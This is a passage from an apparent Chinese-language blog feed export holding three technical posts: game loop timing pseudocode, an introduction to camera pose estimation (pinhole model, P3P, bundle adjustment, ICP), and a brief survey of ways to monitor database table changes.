<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while (isRunning)</span><br><span class="line">&#123;</span><br><span class="line">	updateEverything();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="固定拖时间更新法"><a href="#固定拖时间更新法" class="headerlink" title="固定拖时间更新法"></a>固定拖时间更新法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while (isRunning)</span><br><span class="line">&#123;</span><br><span class="line">	updateEverything();</span><br><span class="line">	sleep(1.0&#x2F;60);&#x2F;&#x2F;程序进程等待1&#x2F;60秒</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="累积时间更新法"><a href="#累积时间更新法" class="headerlink" title="累积时间更新法"></a>累积时间更新法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* getCurrentTime()每次调用返回当前的时间 *&#x2F;</span><br><span class="line">float lastUpdateTime &#x3D; getCurrentTime();</span><br><span class="line">while (isRunning)</span><br><span class="line">&#123;</span><br><span class="line">	float currentTime &#x3D; getCurrentTime();</span><br><span class="line">	float deltaTime &#x3D; currentTime - lastUpdateTime;</span><br><span class="line">    &#x2F;* 每调用updateEverything()后检查时间，</span><br><span class="line">     直到过去的时间达到1&#x2F;60秒就进行下一次更新 *&#x2F;</span><br><span class="line">	if (deltaTime &gt;&#x3D; 1.0&#x2F;60)</span><br><span class="line">	&#123;</span><br><span class="line">		lastUpdateTime &#x3D; currentTime;</span><br><span class="line">		updateEverything();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="图形更新调用法"><a href="#图形更新调用法" class="headerlink" title="图形更新调用法"></a>图形更新调用法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while (isRunning)</span><br><span class="line">&#123;</span><br><span class="line">	updateEverything();</span><br><span class="line">	&#x2F;* 等待垂直同步信号间的空白时间，程序执行到这里会进入等待</span><br><span class="line">	 一般会被封装在类似swapBuffer之类的图形API中执行，</span><br><span class="line">	 但是程序要开启了垂直同步的功能才有效。</span><br><span class="line">	 不过貌似现在的智能手机都默认有垂直同步的效果，</span><br><span class="line">	 当然手机和PC的硬件技术不同，可能也不叫这个名字了。*&#x2F;</span><br><span class="line">	waitForVerticalBlank();</span><br><span class="line">	drawEverything();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="死循环并计算时间差用于更新法"><a href="#死循环并计算时间差用于更新法" class="headerlink" title="死循环并计算时间差用于更新法"></a>死循环并计算时间差用于更新法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">float lastUpdateTime &#x3D; getCurrentTime();</span><br><span class="line">while (isRunning)</span><br><span class="line">&#123;</span><br><span class="line">	float currentTime &#x3D; getCurrentTime();</span><br><span class="line">	float deltaTime &#x3D; currentTime - lastUpdateTime;</span><br><span class="line">	lastUpdateTime &#x3D; currentTime;</span><br><span class="line">	updateEverything(deltaTime);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void updateMove(float deltaTime)</span><br><span class="line">&#123;</span><br><span class="line">	position.x +&#x3D; speedX * deltaTime;</span><br><span class="line">	position.y +&#x3D; speedY * deltaTime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="累积时间半固定时长等图形更新并将时间差用于更新法"><a href="#累积时间半固定时长等图形更新并将时间差用于更新法" class="headerlink" title="累积时间半固定时长等图形更新并将时间差用于更新法"></a>累积时间半固定时长等图形更新并将时间差用于更新法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;假设目标是60帧&#x2F;秒更新的游戏</span><br><span class="line">float lastUpdateTime &#x3D; getCurrentTime();</span><br><span class="line">while (isRunning)</span><br><span class="line">&#123;</span><br><span class="line">	float currentTime &#x3D; getCurrentTime();</span><br><span class="line">	float deltaTime &#x3D; currentTime - lastUpdateTime;</span><br><span class="line">	lastUpdateTime &#x3D; currentTime;</span><br><span class="line">    &#x2F;* 如果游戏太卡，过长的时间差可能会导致跳过一些不能跳过的游戏逻辑，所以做一些人为限制 *&#x2F;</span><br><span class="line">    if (deltaTime &gt; 1.0&#x2F;30) deltaTime &#x3D; 1.0&#x2F;30;</span><br><span class="line">	updateEverything(deltaTime);</span><br><span class="line">	waitForVerticalBlank();</span><br><span class="line">	drawEverything();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述方法只针对单机游戏有效，如果是网络游戏，考虑客户端之间的同步问题的话，帧速不稳定地变来变去是不好的，我们可以记录过去的时间里跑过的帧数，如果达不到目标帧数就连续进行更新直到赶上需要的帧数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;假设目标是60帧&#x2F;秒更新的游戏</span><br><span class="line">float startTime &#x3D; getCurrentTime();</span><br><span class="line">long passedFrames &#x3D; 0;</span><br><span class="line">while (isRunning)</span><br><span class="line">&#123;</span><br><span class="line">	float currentTime &#x3D; getCurrentTime();</span><br><span class="line">	float totalTime &#x3D; currentTime - startTime;</span><br><span class="line">	long targetTotalFrames &#x3D; totalTime&#x2F;(1.0&#x2F;60);</span><br><span class="line">	&#x2F;* 如果某一次更新耗时太久，则会导致passedFrames和targetTotalFrames差太多，所以就连续更新好几次逻辑来赶上目标的更新次数，以保证游戏的进度稳定*&#x2F;</span><br><span class="line">	while (passedFrames &lt; targetTotalFrames)</span><br><span class="line">	&#123;</span><br><span class="line">		updateEverything();</span><br><span class="line">		passedFrames++;</span><br><span class="line">	&#125;</span><br><span class="line">	&#x2F;* 图形更新应该在逻辑完全完成更新以后才进行 *&#x2F;</span><br><span class="line">	drawEverything();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="游戏时间"><a href="#游戏时间" class="headerlink" title="游戏时间"></a>游戏时间</h1><p>计算机是通过高分辨率计时器来衡量现实时间的，而游戏时间显然不能和真实事件的时间线一致，每个游戏都会有自身的时间线，该时间线和真实时间是两个平行的世界。开发者可以暂停游戏，冻结时间线，也可以通过某种指令来加速时间线，这些对于游戏的调试非常有帮助。一些游戏也会有一些类似时光倒流或者时间变慢的特殊特效，而这些都是通过操作时间线来完成的。</p>
<p>现在假设游戏程序以 60 FPS 在运行，则每帧的处理时间大约为16毫秒。如果想要确保帧率稳定运行，每次循环的处理时间都应该小于这个值，剩余的时间，程序进入睡眠状态：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while(true)</span><br><span class="line">&#123;</span><br><span class="line">    double start &#x3D; getCurrentTime();</span><br><span class="line"></span><br><span class="line">    processInput();</span><br><span class="line">    udpate();</span><br><span class="line">    render();</span><br><span class="line"></span><br><span class="line">    sleep(start + MS_PER_FRAME - getCurrentTime());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果每帧的处理时间小于16毫秒，sleep 可以保证游戏不会运行的太快。但是如果游戏的每帧超过16毫秒则会出现卡顿现象。</p>
<p>上面的代码中如果正常的情况下，可以确保每帧推进游戏进程16毫秒，但是因为每帧执行的时间无法固定，会导致帧处理时间超出固定的16毫秒而将游戏拖慢。在无法保证帧处理时间的情况下，我们尝试动态的更新策略，让每帧推进的时间不再是固定的16毫秒，而是根据帧处理的时间来动态调整：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">double lastTime &#x3D; getCurrentTime();</span><br><span class="line">while (true)</span><br><span class="line">&#123;</span><br><span class="line">    double current &#x3D; getCurrentTime();</span><br><span class="line">    double elapsed &#x3D; current - lastTime;</span><br><span class="line">    processInput();</span><br><span class="line">    update(elapsed);</span><br><span class="line">    render();</span><br><span class="line">    lastTime &#x3D; current;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>每一帧我们都计算花费的真实时间（elapsed），而这条根据真实时间测量的时间线被称为全局时间线，所有的游戏内部 update() 逻辑都是基于这条全局时间线。update() 函数内部的处理逻辑会根据传入的时间间隔来驱动所有物体的动态效果，每个物体都有自己的局部时间线，这个局部时间线和全局时间线之间存在着一定的比例关系。例如游戏中存在一个飞行的子弹，子弹的飞行距离 = 子弹的飞行速度 * 子弹的飞行时间。这里的飞行时间并不一定是上面提到的全局时间线，可能是它的1/2或者2倍都是可以的，具体的快慢比例完全取决于你的游戏配置，这条和全局时间线比例不同的时间线也就是局部时间线。</p>
<p>游戏中渲染通常并不会被时间所影响，因为渲染引擎只是单纯的渲染某一时刻的数据逻辑，一般和时间没有关系。受影响的主要是游戏的逻辑更新部分，为了保证不会出现不同硬件的游戏效果不一致，我们可以固定游戏逻辑的更新时间间隔，确保更新频率保持一致。这样做虽然可能导致在配置好的机器上相同的逻辑被渲染多次，但是这显然并不会影响游戏逻辑。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">double previous &#x3D; getCurrentTime();</span><br><span class="line">double lag &#x3D; 0.0; </span><br><span class="line">while (true) &#123; </span><br><span class="line">	double current &#x3D; getCurrentTime(); </span><br><span class="line">	double elapsed &#x3D; current - previous; </span><br><span class="line">	previous &#x3D; current; </span><br><span class="line">	lag +&#x3D; elapsed;</span><br><span class="line"></span><br><span class="line">	processInput();</span><br><span class="line">	while (lag &gt;&#x3D; MS_PER_UPDATE)</span><br><span class="line">	&#123;</span><br><span class="line">		update();</span><br><span class="line">		lag -&#x3D; MS_PER_UPDATE;</span><br><span class="line">	&#125;</span><br><span class="line">    render();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在<strong>游戏渲染时间线和游戏的更新时间线</strong>已经分离，代码中保持游戏的更新时间线以固定的时间间隔推进，这个时间间隔越短，update() 更新的频率越快，越慢更新的频率越低，过慢的更新频率会导致游戏产生抖动现象，不过因为时间步长和硬件不相关，这种现象只会出现在低端机器上。</p>
<p>通过上面的代码基本上已经可以解决游戏循环的大部分问题了，但是还会出现一种现象，就是当一次循环消耗过长的时间，在下一次游戏渲染的时候，渲染的数据仍然是上一个时间点的数据，而不是真实时间点的数据，这听起来不太容易理解，可以看下面的示意图：</p>
<p align="center">
    <img src="images/game-loop-timeline.png" width="100%" alt="游戏更新与渲染"/>
</p>
<center>图1 游戏更新与渲染不一致</center>

<p>在图中可以看出这是一个游戏的更新渲染序列，这里看第三次渲染（红点的位置）。因为上一帧的时间花费过长，导致在一帧的逻辑中调用了 update() 两次，进行了两次更新，这时渲染和更新的时间线发生偏移，渲染的真实位置在两次更新逻辑的中间，而渲染的结果却是上一次更新的结果（绿点的位置）。这显然是不对的，因为渲染的结果和现在真实的更新结果并不一样，这时候我们需要计算出二者时间线的偏移值，让渲染的结果符合真实的更新逻辑，也就是说需要计算出从绿点到红点位置的数据变化情况，只有这样渲染的结果才符合常理。</p>
<p>解决这个问题其实很简单，只需要将偏移的大小告诉渲染逻辑即可，渲染逻辑怎样处理这个偏移时间还需要程序自己来决定。</p>
<p>将渲染的代码改为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">render(lag &#x2F; MS_PER_UPDATE);</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://blog.jmecn.net/chapter-16-physics-engine/" target="_blank" rel="noopener">第十六章：物理引擎</a>,by 冰点.</li>
<li><a href="https://www.zhihu.com/question/277300055" target="_blank" rel="noopener">为什么单机游戏中的碰撞很不真实？物理引擎真的很难做到和现实一样吗？</a>,by zhihu.</li>
<li><a href="http://blog.gifplane.com/2018/10/08/1-UnityOpt14.html" target="_blank" rel="noopener">5.1、Faster Physics(一)</a>,by GIFPlane.</li>
<li><a href="http://www.luvfight.me/game-loop/" target="_blank" rel="noopener">游戏主循环、帧速控制</a>,by luvfight.</li>
<li><a href="http://www.luvfight.me/update-components/" target="_blank" rel="noopener">一些游戏程序的基础知识（一）</a>,by luvfight.</li>
<li><a href="http://www.luvfight.me/draw-components/" target="_blank" rel="noopener">一些游戏程序的基础知识（二）</a>,by luvfight.</li>
<li><a href="https://www.cnblogs.com/murongxiaopifu/p/7683140.html" target="_blank" rel="noopener">FixedUpdate真的是固定的时间间隔执行吗？聊聊游戏定时器</a>,by 嘉栋.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E6%AC%A7%E6%8B%89%E6%96%B9%E6%B3%95" target="_blank" rel="noopener">欧拉方法</a>,by wikipedia.</li>
<li><a href="https://wangzhechao.com/2dgames/chapter11/game%20loop.html" target="_blank" rel="noopener">游戏循环</a>,by 没事造轮子.</li>
<li><a href="https://www.zhihu.com/question/27765214" target="_blank" rel="noopener">大型多人在线游戏的开发中，如何做到每个玩家动作的实时同步的？</a>,by zhihu.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
      </tags>
  </entry>
  <entry>
    <title>相机位姿估计入门</title>
    <url>/2019/05/29/%E7%9B%B8%E6%9C%BA%E4%BD%8D%E5%A7%BF%E4%BC%B0%E8%AE%A1%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>相机位姿估计是指给定若干图像，估计其中相机运动的问题。求解方法通常分特征点法和直接法两种。下面主要介绍特征点法。</p>
<p>特征点法的思路是先从图像当中提取许多特征，然后在图像间进行特征匹配，这样就得到许多匹配好的点，再根据这些点进行相机位姿的求解。根据传感器形式的不同，可以分成三种情况：</p>
<ul>
<li>2D-2D，单目相机获取的影像，只能获得像素坐标</li>
<li>3D-3D配对点，RGBD或双目相机，可以获取深度信息</li>
<li>3D-2D，已知一张图中的3D信息，另一张图只有2D信息</li>
</ul>
<h1 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h1><p>在两帧各自的相机坐标系中，设P点的相机坐标系的坐标分别为$P_1$、$P_2$，如图1所示。</p>
<p align="center">
    <img src="images/cameraEstimate.png" width="90%" alt="相机位姿估计示意图"/>
</p>
<center>图1  相机位姿估计示意图</center>

<p>其中：</p>
<p>$$P_{1}=\begin{pmatrix}<br>X_{1}\<br>Y_{1}\<br>Z_{1}<br>\end{pmatrix},P_{2}=\begin{pmatrix}<br>X_{2}\<br>Y_{2}\<br>Z_{2}<br>\end{pmatrix}$$</p>
<p>相机从第一帧移动到第二帧，其旋转矩阵设为R，平移向量设为t。这里的R表示的旋转是相对于第一帧的姿态改变量。那么有:</p>
<p>$$P_{2}=RP_{1}+t \tag{1}$$</p>
<p>相机位姿估计的最终目的就是要根据这个运动方程，求解出相机的运动，也就是R、t。<strong>注意这里的R、t并不是相机外参！</strong></p>
<p>由于$P_1$、$P_2$的坐标未知，但其在像素坐标系的坐标$p_1$、$p_2$已知，因此，根据小孔成像模型寻找$p_1$、$p_2$和$P_1$、$P_2$之间的关系。</p>
<h1 id="小孔成像模型"><a href="#小孔成像模型" class="headerlink" title="小孔成像模型"></a>小孔成像模型</h1><p>小孔成像模型的示意图如图2所示。设P点在世界坐标系下坐标为$P_w$在相机坐标系下坐标为$P_c$，物理成像平面对应坐标为 $P’$, 像素平面对应坐标为p, 有：</p>
<p>$$p=\begin{pmatrix}<br>u\<br>v<br>\end{pmatrix},P^{‘}=\begin{pmatrix}<br>X^{‘}\<br>Y^{‘}\<br>Z^{‘}<br>\end{pmatrix},P_c=\begin{pmatrix}<br>X_c\<br>Y_c\<br>Z_c<br>\end{pmatrix},P_w=\begin{pmatrix}<br>X_w\<br>Y_w\<br>Z_w<br>\end{pmatrix}$$</p>
<p align="center">
    <img src="images/cameraModel.png" width="90%" alt="小孔成像模型示意图"/>
</p>
<center>图2  小孔成像模型示意图</center>

<p>根据小孔成像模型，有如下公式：</p>
<p>$$<br>\begin{pmatrix}<br>u\<br>v\<br>1<br>\end{pmatrix}=\frac{1}{Z_{c}}\begin{pmatrix}<br>f_{x} &amp; 0 &amp; c_{x}\<br>0 &amp; f_{y} &amp; c_{y}\<br>0 &amp; 0 &amp; 1<br>\end{pmatrix}\begin{pmatrix}<br>X_{c}\<br>Y_{c}\<br>Z_{c}<br>\end{pmatrix} \tag{2}$$</p>
<p>该公式给出了点P相机坐标系下坐标与像素平面坐标之间的关系。</p>
<h1 id="2D-2D估计"><a href="#2D-2D估计" class="headerlink" title="2D-2D估计"></a>2D-2D估计</h1><p>设相机内参矩阵为K，即</p>
<p>$$<br>K=\begin{pmatrix}<br>f_{x} &amp; 0 &amp; c_{x}\<br>0 &amp; f_{y} &amp; c_{y}\<br>0 &amp; 0 &amp; 1<br>\end{pmatrix}<br>$$</p>
<p>将公式(2)代入公式(1)，则</p>
<p>$$K^{-1}Z_{2}p_{2}=RK^{-1}Z_{1}p_{1}+t \tag{3}$$</p>
<p>内参矩阵K短期内不变，但$Z_1$很明显一般情况下不等于$Z_2$，除非是相机绕着P点为圆心旋转。<strong>现在已知的是K、p1、p2，待求R，t</strong>。 然而这里还有$Z_1$、$Z_2$是未知的，因此必须想办法将$Z$消去。</p>
<p>将相机坐标系下坐标$P_c$归一化，即</p>
<p>$$<br>P_{c}^{‘}=\begin{pmatrix}<br>{X_{c}}/{Z_{c}}\<br>{Y_{c}}/{Z_{c}}\<br>1<br>\end{pmatrix}<br>$$</p>
<p>由公式(2)可得：</p>
<p>$$<br>\begin{pmatrix}<br>u\<br>v\<br>1<br>\end{pmatrix}=\begin{pmatrix}<br>f_{x} &amp; 0 &amp; c_{x}\<br>0 &amp; f_{y} &amp; c_{y}\<br>0 &amp; 0 &amp; 1<br>\end{pmatrix}\begin{pmatrix}<br>{X_{c}}/{Z_{c}}\<br>{Y_{c}}/{Z_{c}}\<br>1<br>\end{pmatrix} =K\begin{pmatrix}<br>{X_{c}}/{Z_{c}}\<br>{Y_{c}}/{Z_{c}}\<br>1<br>\end{pmatrix} \tag{4}$$</p>
<p>将公式(4)代入公式(1)，则有：</p>
<p>$$K^{-1}p_{2}=RK^{-1}p_{1}+t$$</p>
<p>这样便能求解了。但是也导致了一个问题，因为不同帧对应的相机坐标系中P的Z值并不相等。在实际操作中分别除以其本身从而将Z分量归一化为1，这其实就丢失了真实的位置信息，不同帧的缩放是不等的！从而导致2D-2D估计两两帧之间，每次估计的尺度都是不同的。这也就是单目SLAM的尺度不确定性。</p>
<p><strong>通过2D-2D，最终可获得P点像素坐标 $p$ 对应相机坐标系下归一化坐标$P_{c}^{‘}$</strong>。</p>
<h1 id="三角测量"><a href="#三角测量" class="headerlink" title="三角测量"></a>三角测量</h1><p>三角测量在三角学与几何学上是一借由测量目标点与固定基准线的已知端点的角度，测量目标距离的方法。而不是直接测量特定位置的距离（三边量测法）。当已知一个边长及两个观测角度时，观测目标点可以被标定为一个三角形的第三个点。</p>
<h2 id="基于两固定角度之距离量测"><a href="#基于两固定角度之距离量测" class="headerlink" title="基于两固定角度之距离量测"></a>基于两固定角度之距离量测</h2><p>假设一量测目标点及两个已知座标的参考点可形成一个三角形，则借由计算三角形其中参考边的长度，量测两参考点与目标点形成的角度，即可找出目标点的距离及座标。</p>
<p align="center">
    <img src="images/Distance_by_triangulation.svg.png" width="90%" alt="基于两固定角度之距离量测示意图"/>
</p>
<center>图3  基于两固定角度之距离量测示意图</center>

<p>三角测量可用来计算岸边与船只之间的距离及座标。A顶点的观察者测量岸边与船只之间的角度α，B点的观察者则依同理测量出角度β，由长度l或已知的A及B点座标，则可由正弦定理取得在C点船只的座标及距离d。</p>
<p>计算过程如下：</p>
<p>$$ \ell = \frac{d}{\tan \alpha} + \frac{d}{\tan \beta}$$</p>
<p>根据三角恒等式${\displaystyle \tan \alpha ={\frac {\sin \alpha }{\cos \alpha }}}$和${\displaystyle \sin \left(\alpha +\beta \right)=\sin \alpha \cos \beta +\cos \alpha \sin \beta }$，此式可等于：</p>
<p>$${\displaystyle \ell =d\left({\frac {\cos \alpha }{\sin \alpha }}+{\frac {\cos \beta }{\sin \beta }}\right)}$$</p>
<p>$${\displaystyle \ell =d\ {\frac {\sin(\alpha +\beta )}{\sin \alpha \sin \beta }}}$$</p>
<p>因此，</p>
<p>$${\displaystyle d=\ell \ {\frac {\sin \alpha \sin \beta }{\sin(\alpha +\beta )}}}$$</p>
<p>由此便可简单定义出一未知点与观察点间的距离，以及与观察点往东西、南北向相差的位移量，终得完整座标。</p>
<p><strong>2D-2D估计获得特征点在相机坐标系下的归一化3D坐标，结合三角测量，可获得特征点在相机坐标系下的深度，两者结合即获得特征点在相机坐标系下的3D坐标。</strong></p>
<h1 id="3D-2D估计"><a href="#3D-2D估计" class="headerlink" title="3D-2D估计"></a>3D-2D估计</h1><p>3D-2D估计本质是PnP一个问题，即给定世界坐标系中n个3D点及其在图像中的相应2D投影的情况下，估计校准相机的姿势的问题。相机姿势由6个自由度（DOF）组成，其由旋转（滚动，俯仰和偏航）以及相机相对于世界的3D平移构成。该问题源于相机校准，并且在计算机视觉和其他领域中具有许多应用，包括3D姿态估计、机器人和增强现实。 对于n = 3，存在一个常用的问题解决方案，称为P3P，并且许多解决方案适用于n≥3的一般情况。</p>
<h2 id="P3P"><a href="#P3P" class="headerlink" title="P3P"></a>P3P</h2><p>P3P仅需要使用三对匹配点，就可以完成相机的位姿估计。</p>
<p>假设空间中有A,B,C三点，投影到成像平面中有a,b,c三点，在PnP问题中，A,B,C在世界坐标系下的坐标是已知的，但是在相机坐标系下的坐标是未知的。a,b,c的坐标是已知的。PnP的目的就是要求解A,B,C在相机坐标系下的坐标值。如下图所示。需要注意的是三角形abc和三角形ABC不一定是平行的。</p>
<p align="center">
    <img src="images/p3p.png" width="90%" alt="P3P问题示意图"/>
</p>
<center>图4  P3P问题示意图</center>

<p>根据余弦定理有：</p>
<p>$$OA^2 + OB^2 - 2OA \cdot OB \cdot \cos(a,b) = AB^2 \ OB^2 + OC^2 - 2OB \cdot OC \cdot \cos(b,c) = BC^2 \ OA^2 + OC^2 - 2OA \cdot OC \cdot \cos(a,c) = AC^2$$</p>
<p>记$x=\dfrac{OA}{OC}$,$y=\dfrac{OB}{OC}$，因为A,B,C在相机坐标系中的坐标未知，因此x，y是未知的。</p>
<p>另记$u=\dfrac{BC^2}{AB^2}$,$w=\dfrac{AC}{AB}$, 根据A,B,C的世界坐标，u,w是可以求出的。</p>
<p>通过一系列的转化可以得到两个等式：</p>
<p>$$(1-u)y^2-ux^2-\cos(b,c)y+2uxy \cos(a,b) +1 = 0 \ (1-w)x^2-wy^2-\cos(a,c)x+2wxy \cos(a,b) +1 = 0$$</p>
<p>该方程组是关于x,y的一个二元二次方程，可以通过吴消元法求解。最多可能得到四个解，因此在三个点之外还需要一组匹配点进行验证。</p>
<p>至此，通过x和y就可以求得A，B，C在相机坐标下的坐标值。因此3D-2D问题转变成了3D-3D的位姿估计问题。而带有匹配信息的3D-3D位姿求解非常容易。</p>
<h2 id="Bundle-Adjustment"><a href="#Bundle-Adjustment" class="headerlink" title="Bundle Adjustment"></a>Bundle Adjustment</h2><p>假设某空间点坐标为$P_i = [X_i, Y_i, Z_i]$, 其投影的像素坐标为$p_i=[u_i,v_i]$。这些在PnP问题里都是已知的。在相机坐标系下有$c=[x_i, y_i, z_i]$，这个坐标通过P3P或者其他解法有了粗略的估计。根据针孔相机模型可得：</p>
<p>$$z_i p_i = KTP_i = K \exp([\xi]_{\times})P_i$$</p>
<p>根据这个等式可以构造出一个最小二乘问题：</p>
<p>$$\xi^* = \arg \min \limits <em>{\xi} \dfrac{1}{2} \sum\limits  _{i=1} ^n \begin{Vmatrix} p_i - \dfrac{1}{z_i} K \exp([\xi]</em>{\times})P_i \end{Vmatrix} _2 ^2$$</p>
<p>该问题的误差项，是将像素坐标与3D点按照当前估计的位姿进行投影得到的位置相比较得到的误差，所以称之为重投影误差。如图5所示。</p>
<p align="center">
    <img src="images/reProjectiveError.png" width="90%" alt="重投影误差示意图"/>
</p>
<center>图5  重投影误差示意图</center>

<p>这个最小二乘问题主要优化两个变量，第一是对相机位姿的优化，也就是对李代数的优化，第二是对空间点P的优化，也就是P点的优化。</p>
<h1 id="3D-3D估计"><a href="#3D-3D估计" class="headerlink" title="3D-3D估计"></a>3D-3D估计</h1><p>3D-3D的位姿估计问题是指，对于空间中的某一点，我们知道这个点在两个相机坐标系中的三维坐标，如何利用这两个三维坐标来求解这两个相机坐标系的运动就是3D-3D的位姿评估问题。这个问题通常用迭代最近点(Iterative Closest Point,ICP)求解。</p>
<p>假设空间中的一系列点在第一个相机坐标系下的三维坐标为$C={c_1,…,c_n}$，在第二个相机坐标系下匹配的三维坐标为$C’={c_1’,…,c’_n}$。则有：</p>
<p>$$\forall i, \ c_i=Rc_i’+t$$</p>
<p>对于ICP的求解主要分为两种方式：<strong>利用线性代数的求解和利用非线性优化方式求解</strong>。</p>
<h2 id="线性代数求解"><a href="#线性代数求解" class="headerlink" title="线性代数求解"></a>线性代数求解</h2><p>构造误差项：</p>
<p>$$e_i = c_i - (Rc_i’+t)$$</p>
<p>将这个误差项构造成一个最小二乘问题：</p>
<p>$$\min \limits _{R,t} J= \dfrac{1}{2} \sum \limits _{i=1} ^n \begin{Vmatrix} c_i - (Rc_i’+t) \end{Vmatrix} _2 ^2$$</p>
<p>通过求解这个最小二乘问题，我们可以得到R和t。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>相机位姿估计最终目标是获得表征相机运动的旋转矩阵R和平移向量t，可分成两种方法：一种是2D-2D估计加三角测量，另一种是3D-2D估计加3D-3D估计。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://zhaoxuhui.top/blog/2018/03/18/Location&PoseEstimationInSLAM.html" target="_blank" rel="noopener">SLAM相机位姿估计(1)</a>,by zhaoxuhui.</li>
<li><a href="https://www.jianshu.com/p/fbf56587a268" target="_blank" rel="noopener">2D-2D相机位姿估计</a>,by 金戈大王.</li>
<li><a href="https://zhehangt.github.io/2017/03/05/SLAM/Basic/EpipolarGeometry/" target="_blank" rel="noopener">单目相机中的对极几何</a>,by 一索哥传奇.</li>
<li><a href="https://www.jianshu.com/p/96d3b832330e" target="_blank" rel="noopener">三角测量</a>,by 金戈大王.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E4%B8%89%E8%A7%92%E6%B8%AC%E9%87%8F" target="_blank" rel="noopener">三角测量</a>,by wikipedia.</li>
<li><a href="https://zhehangt.github.io/2017/03/06/SLAM/Basic/Triangularization/" target="_blank" rel="noopener">单目相机中的三角化测量</a>,by 一索哥传奇.</li>
<li><a href="https://www.jianshu.com/p/f16e5b5cc47d" target="_blank" rel="noopener">3D-2D相机位姿估计</a>,by 金戈大王.</li>
<li><a href="https://www.jianshu.com/p/504f0e5d9c26" target="_blank" rel="noopener">3D-3D相机位姿估计</a>,by 金戈大王.</li>
<li><a href="https://www.zhihu.com/question/51510464" target="_blank" rel="noopener">相机位姿求解问题？</a>, by zhihu.</li>
<li><a href="https://zhehangt.github.io/2017/03/07/SLAM/Basic/PnP/" target="_blank" rel="noopener">3D-2D的运动估计</a>,by 一索哥传奇.</li>
<li><a href="https://zhehangt.github.io/2017/03/17/SLAM/Basic/ICP/" target="_blank" rel="noopener">3D-3D的运动估计</a>,by 一索哥传奇.</li>
<li><a href="https://www.cnblogs.com/mafuqiang/p/8302663.html" target="_blank" rel="noopener">相机位姿求解——P3P问题</a>,by 达达MFZ.</li>
<li><a href="https://zhuanlan.zhihu.com/p/32030223" target="_blank" rel="noopener">图像二维坐标转世界三维坐标</a>,by 橙子.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机图形学</tag>
        <tag>无人机</tag>
      </tags>
  </entry>
  <entry>
    <title>监控数据库表记录变化的解决方案</title>
    <url>/2023/02/01/%E7%9B%91%E6%8E%A7%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E8%AE%B0%E5%BD%95%E5%8F%98%E5%8C%96%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<p>监控数据库表记录的变化，并从中获取变化后的数据，这是二次开发所面临的难题。目前有多种解决方案，各有优缺点。</p>
<h1 id="触发器（Trigger）加异步通知（Notify）"><a href="#触发器（Trigger）加异步通知（Notify）" class="headerlink" title="触发器（Trigger）加异步通知（Notify）"></a>触发器（Trigger）加异步通知（Notify）</h1><p>实例请参考<a href="https://www.cnblogs.com/SmallCarp/p/16033308.html" target="_blank" rel="noopener">SQL 监控表字段变化</a>。</p>
<h1 id="监听数据库操作日志"><a href="#监听数据库操作日志" class="headerlink" title="监听数据库操作日志"></a>监听数据库操作日志</h1><p>例如mysql可以通过配置my.ini将数据库操作日志写到文本文件中，然后通过分析文本去获取变化。</p>
<h1 id="轮询数据库表"><a href="#轮询数据库表" class="headerlink" title="轮询数据库表"></a>轮询数据库表</h1><p>每隔一段时间获取数据库表记录，查找数据是否发生变化。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.51cto.com/u_15127543/3515178" target="_blank" rel="noopener">java实时监控mysql数据库变化</a>,by mob604756eccc76.</li>
<li><a href="http://www.hzdledu.cn/hzzx/jswz/1083.html" target="_blank" rel="noopener">如何用python监视mysql数据库的更新？</a>,by hzdledu.</li>
<li><a href="https://blog.csdn.net/m0_37583655/article/details/121421909" target="_blank" rel="noopener">数据同步中间件DBSyncer</a>,by 靖节先生.</li>
<li><a href="https://github.com/alibaba/DataX" target="_blank" rel="noopener">DataX</a>,by alibaba.</li>
<li><a href="https://blog.csdn.net/inrgihc/article/details/114000246" target="_blank" rel="noopener">各种开源数据库同步工具汇总</a>,by inrgihc.</li>
<li><a href="https://www.cnblogs.com/SmallCarp/p/16033308.html" target="_blank" rel="noopener">SQL 监控表字段变化</a>,by 说不出来.</li>
